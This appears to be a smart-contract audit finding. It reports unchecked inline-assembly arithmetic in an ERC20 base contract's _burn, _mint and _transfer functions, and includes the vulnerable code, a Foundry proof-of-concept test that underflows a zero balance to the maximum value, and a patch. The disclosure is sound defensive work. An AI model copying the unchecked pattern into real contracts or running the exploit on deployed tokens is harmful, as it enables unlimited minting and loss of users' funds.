# Unsafe Assembly in `_burn`, `_mint`, and `_transfer` Allows Integer Overflow/Underflow Leading to Infinite Token Minting

**File Scope:** `src/helpers/ERC20Internals.sol`

# Root + Impact

## Description

*   **Normal Behavior**: Standard ERC20 implementations must ensure that arithmetic operations (minting, burning, transferring) are safe from overflows and underflows. For example, burning tokens should revert if the user's balance is insufficient, and minting should revert if it causes the total supply to overflow.

*   **Specific Issue**: The `Token-0x` implementation utilizes inline assembly (`Yul`) for gas optimization in `_burn`, `_mint`, and `_transfer` but fails to include the necessary manual arithmetic checks. This absence allows the `_burn` function to underflow a user's balance and the `_mint` function to overflow the total supply or a user's balance.

```solidity
// Root cause in src/helpers/ERC20Internals.sol

    function _burn(address account, uint256 value) internal {
        assembly ("memory-safe") {
            // ... (omitted code)

            let ptr := mload(0x40)
            let balanceSlot := _balances.slot
            let supplySlot := _totalSupply.slot

            let supply := sload(supplySlot)
            sstore(supplySlot, sub(supply, value)) // @> No underflow check for totalSupply

            mstore(ptr, account)
            mstore(add(ptr, 0x20), balanceSlot)

            let accountBalanceSlot := keccak256(ptr, 0x40)
            let accountBalance := sload(accountBalanceSlot)
            sstore(accountBalanceSlot, sub(accountBalance, value)) // @> No underflow check for accountBalance
        }
    }
```

## Risk

**Likelihood**: High

*   The contract is designed as a base ERC20 implementation intended for inheritance by other protocols.
*   The `burn` functionality is a standard and widely used ERC20 extension (e.g., `ERC20Burnable`), making it highly probable that inheriting contracts will expose this vulnerable `_burn` function to end-users.

**Impact**: High

*   An attacker with zero balance can trigger an underflow by burning tokens, setting their balance to `2^256 - 1` (effectively infinite tokens).
*   This completely destroys the token's economy and renders the protocol using it useless.

## Proof of Concept

**Short Explanation**: 
The vulnerability is triggered by calling `burn(1)` on an account with `0` balance. Since the assembly block lacks a conditional check (e.g., `if lt(balance, amount) revert(...)`), the subtraction `0 - 1` underflows, resulting in `type(uint256).max`.

The following test case demonstrates how a user with 0 tokens can burn 1 token to achieve a max `uint256` balance.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/ERC20.sol";

// Mock token inheriting from the vulnerable base
contract Token is ERC20 {
    constructor() ERC20("Token", "TKN") {}

    // Exposing the internal _burn function as is common in Burnable tokens
    function burn(address from, uint256 amount) public {
        _burn(from, amount);
    }
}

contract VulnPoC is Test {
    Token token;
    address user = address(0x1);

    function setUp() public {
        token = new Token();
    }

    function testBurnUnderflow() public {
        // 1. Verify user starts with 0 balance
        assertEq(token.balanceOf(user), 0);

        // 2. User burns 1 token, which should fail but doesn't
        vm.prank(user);
        token.burn(user, 1);

        // 3. Verify the underflow occurred
        // 0 - 1 = 2^256 - 1
        assertEq(token.balanceOf(user), type(uint256).max);
    }
}
```

## Recommended Mitigation

Add manual arithmetic checks within the assembly blocks to prevent overflows and underflows.

```diff
    function _burn(address account, uint256 value) internal {
        assembly ("memory-safe") {
            if iszero(account) {
                mstore(0x00, shl(224, 0x96c6fd1e))
                mstore(add(0x00, 4), 0x00)
                revert(0x00, 0x24)
            }

            let ptr := mload(0x40)
            let balanceSlot := _balances.slot
            let supplySlot := _totalSupply.slot

            let supply := sload(supplySlot)
+           if lt(supply, value) {
+               revert(0, 0)
+           }
            sstore(supplySlot, sub(supply, value))

            mstore(ptr, account)
            mstore(add(ptr, 0x20), balanceSlot)

            let accountBalanceSlot := keccak256(ptr, 0x40)
            let accountBalance := sload(accountBalanceSlot)
+           if lt(accountBalance, value) {
+               revert(0, 0)
+           }
            sstore(accountBalanceSlot, sub(accountBalance, value))
        }
    }
```
